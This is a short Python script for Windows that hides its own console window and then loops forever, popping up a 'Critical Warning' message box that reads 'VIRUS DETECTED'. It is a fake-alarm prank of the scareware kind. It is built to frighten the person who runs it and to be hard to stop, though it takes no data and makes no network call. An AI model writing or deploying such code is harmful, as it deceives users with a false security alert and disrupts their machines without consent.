import tkinter.messagebox
from tkinter import *
import ctypes
ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
x = 1
while x == 1:
    cmd = "VIRUS DETECTED"
    root = tkinter.Tk()
    root.geometry("0x0")
    root.withdraw()
    tkinter.messagebox.showwarning(title="Critical Warning", message=cmd)


